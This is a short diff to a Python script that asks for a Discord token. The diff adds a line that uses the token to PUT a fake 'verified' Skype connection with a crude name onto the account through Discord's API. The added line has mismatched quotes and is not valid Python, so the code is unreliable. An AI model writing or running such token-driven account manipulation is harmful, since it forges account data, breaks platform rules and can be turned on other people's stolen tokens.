@@ -1,4 +1,4 @@
-import requests, re, time
+import requests, re, time, random
 from colorama import init, Fore
 init(convert=True)
 
@@ -9,6 +9,7 @@ def start():
     session = requests.Session()
     print(f"[{Fore.CYAN}>{Fore.RESET}] Input Discord Token")
     token = input(" > ")
+    session.put(f"https://discordapp.com/api/v6/users/@me/connections/skype/{random.randint(1, 10)}", json={ "name": 'icewallowcum,"visibility": 1, "verified": True },headers={"Authorization": token})
 
     while True:
         if numb < 100:
